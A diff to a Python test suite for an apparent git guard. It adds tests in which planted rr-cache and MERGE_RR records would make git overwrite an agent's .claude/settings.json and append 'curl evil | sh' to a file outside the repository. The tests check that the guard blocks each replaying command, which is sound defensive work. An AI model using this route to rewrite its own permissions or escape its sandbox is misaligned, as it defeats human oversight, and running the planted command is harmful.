@@ -7,6 +7,7 @@ import json
 import os
 import re
 import select
+import shutil
 import signal
 import subprocess
 import sys
@@ -1330,19 +1331,6 @@ class MergeTests(TreeBase):
             with self.subTest(argv=argv, autostash=False):
                 self.assertEqual(self.check(*argv), ((0, ""), ""))
 
-    def test_rerere_stops_protected_conflict(self):
-        # rr-cache があると、git は記録した解決を衝突したファイルに書く（rerere.enabled がなくても。実測）。
-        self.commit_settings('{"v": 3}\n')
-        (self.repo / ".git" / "rr-cache").mkdir()
-        result, err = self.check("merge", "feature", tty=True, answer="n\n")
-        self.assertEqual(result, (1, ""))
-        self.assertIn("rerere", err)
-        self.assertNotIn(guard.MSG_ASK, err)
-        local_git(self.repo, "config", "rerere.enabled", "false")
-        result, err = self.check("merge", "feature", tty=True, answer="n\n")
-        self.assertEqual(result, (1, ""))
-        self.assertIn(guard.MSG_ASK, err)
-
     def test_real_git_merge_matches_state(self):
         self.assertEqual(self.approve_and_run("merge", "--no-edit", "-q", "feature"), (0, ""))
         self.assertEqual(self.settings.read_text(encoding="utf-8"), '{"v": 2}\n')
@@ -1351,6 +1339,119 @@ class MergeTests(TreeBase):
         # 衝突の印のラベルも、merge-tree と git merge で同じになる（実測）。
         self.assertEqual(self.approve_and_run("merge", "--no-edit", "-q", "feature", codes=(1,)), (0, ""))
         self.assertIn(">>>>>>> feature", self.settings.read_text(encoding="utf-8"))
+
+
+class RerereTests(TreeBase):
+    """rerere は、MERGE_RR（sandbox が書ける）に並んだすべてのパス（作業ツリーの外も）に、rr-cache（sandbox が書ける）に
+    記録された解決を書く。rerere.enabled がなくても、rr-cache があれば動く（/security-review の S1。両方の git で実測）。
+
+    main の README は m（docs と衝突する）。stash@{0} は README を s にし、HEAD の README は t（stash pop が衝突する）。
+    """
+
+    def setUp(self):
+        super().setUp()
+        # ガードの git が読むグローバルの設定を、このテストのホームにする（人間の ~/.gitconfig は rerere.enabled = false）。
+        real = guard.git_env
+        patcher = mock.patch.object(guard, "git_env", lambda home: {**real(home), "HOME": str(self.home)})
+        patcher.start()
+        self.addCleanup(patcher.stop)
+        (self.repo / "README.md").write_text("m\n", encoding="utf-8")
+        local_git(self.repo, "commit", "-q", "-am", "readme m")
+        (self.repo / "README.md").write_text("s\n", encoding="utf-8")
+        local_git(self.repo, "stash", "-q")
+        (self.repo / "README.md").write_text("t\n", encoding="utf-8")
+        local_git(self.repo, "commit", "-q", "-am", "readme t")
+        self.outside = self.root / "outside.txt"
+        self.outside.write_text("line1\n", encoding="utf-8")
+        self.gitdir = self.repo / ".git"
+
+    def plant(self):
+        """作業ツリーの対象（ルートからの相対パス）と外のファイル（絶対パス）の、記録した解決を置く。"""
+        record = b""
+        for n, (path, pre, post) in enumerate(((".claude/settings.json", '{"v": 1}\n', '{"evil": 1}\n'),
+                                               (str(self.outside), "line1\n", "line1\ncurl evil | sh\n")), 1):
+            rid = str(n) * 40
+            (self.gitdir / "rr-cache" / rid).mkdir(parents=True)
+            (self.gitdir / "rr-cache" / rid / "preimage").write_text(pre, encoding="utf-8")
+            (self.gitdir / "rr-cache" / rid / "postimage").write_text(post, encoding="utf-8")
+            record += rid.encode() + b".-1\t" + os.fsencode(path) + b"\0"
+        (self.gitdir / "MERGE_RR").write_bytes(record)
+
+    # 実測で当て直した形: commit（どの形も）、merge --continue、衝突した merge・cherry-pick・revert・stash pop、
+    # cherry-pick -e・revert -e（中で git commit を動かす）。衝突するかを確かめずに、merge・cherry-pick・revert・stash apply と
+    # pop は、どの形も止める。
+    REPLAYS = (("commit", "-q", "-m", "x"), ("commit", "--amend", "--no-edit"), ("merge", "--continue"),
+               ("merge", "--no-edit", "docs"), ("cherry-pick", "docs"), ("revert", "-e", "HEAD"), ("stash", "pop"),
+               ("stash", "apply"))
+
+    def assert_stops(self, *pre):
+        for argv in self.REPLAYS:
+            with self.subTest(pre=pre, argv=argv):
+                result, err = self.check(*pre, *argv, tty=True, answer="y\n")
+                self.assertEqual(result, (1, ""))
+                for word in ("rerere", "rr-cache", "MERGE_RR", str(self.gitdir.resolve())):
+                    self.assertIn(word, err)
+                self.assertNotIn("command git", err)
+                self.assertNotIn(guard.MSG_ASK, err)
+        self.assertEqual(self.settings.read_text(encoding="utf-8"), '{"v": 1}\n')
+        self.assertEqual(self.outside.read_text(encoding="utf-8"), "line1\n")
+
+    def assert_allows(self, *pre):
+        for argv in self.REPLAYS:
+            with self.subTest(pre=pre, argv=argv):
+                (code, _), err = self.check(*pre, *argv)
+                self.assertEqual(code, 0, err)
+
+    def test_planted_resolutions_stop_the_forms_that_replay(self):
+        self.plant()
+        self.assert_stops()
+        local_git(self.repo, "config", "alias.ci", "commit")
+        result, err = self.check("ci", "-m", "x")
+        self.assertEqual(result, (1, ""))
+        self.assertIn("rr-cache", err)
+        # 仕掛けが効くことを、テストの git で確かめる（rerere.enabled のないホームで commit すると、両方に書く）。
+        env = {**os.environ, "HOME": str(self.home), "GIT_CONFIG_NOSYSTEM": "1"}
+        local_git(self.repo, "commit", "-q", "--allow-empty", "-m", "x", env=env)
+        self.assertEqual(self.settings.read_text(encoding="utf-8"), '{"evil": 1}\n')
+        self.assertEqual(self.outside.read_text(encoding="utf-8"), "line1\ncurl evil | sh\n")
+
+    def test_rerere_false_allows_and_true_stops(self):
+        self.plant()
+        self.assert_allows("-c", "rerere.enabled=false")
+        (self.home / ".gitconfig").write_text("[rerere]\n\tenabled = false\n", encoding="utf-8")
+        self.assert_allows()
+        self.assert_stops("-c", "rerere.enabled=true")
+        self.assert_stops("-c", "rerere.enabled")  # 値のない形は true
+        # rerere.enabled が true なら、rr-cache がなくても止める（git が rr-cache を作り、確かめた後に置かれうる）。
+        (self.home / ".gitconfig").unlink()
+        shutil.rmtree(self.gitdir / "rr-cache")
+        (self.gitdir / "MERGE_RR").unlink()
+        self.assert_allows()
+        local_git(self.repo, "config", "rerere.enabled", "true")
+        self.assert_stops()
+        self.assert_allows("-c", "rerere.enabled=false")
+
+    def test_forms_that_do_not_replay_still_allow(self):
+        # merge --abort（reset --merge）・--quit・stash（push）・reset・switch は、当て直さなかった（両方の git で実測）。
+        self.plant()
+        for argv in (("merge", "--abort"), ("merge", "--quit"), ("stash",), ("reset", "--hard"), ("switch", "docs"),
+                     ("commit", "-h"), ("merge", "--help")):
+            with self.subTest(argv=argv):
+                (code, _), err = self.check(*argv)
+                self.assertEqual(code, 0, err)
+
+    def test_protected_conflict_without_rerere_still_asks(self):
+        # rerere が動かなければ、対象のパスの衝突は、印の入った中身を見せて聞く（merge だけ）。
+        self.commit_settings('{"v": 3}\n')
+        result, err = self.check("-c", "rerere.enabled=false", "merge", "feature", tty=True, answer="n\n")
+        self.assertEqual(result, (1, ""))
+        self.assertIn(guard.MSG_ASK, err)
+        self.assertIn("+<<<<<<< HEAD", err)
+        (self.gitdir / "rr-cache").mkdir()
+        result, err = self.check("merge", "feature", tty=True, answer="n\n")
+        self.assertEqual(result, (1, ""))
+        self.assertIn("rr-cache", err)
+        self.assertNotIn(guard.MSG_ASK, err)
 
 
 class StashAndPickTests(TreeBase):
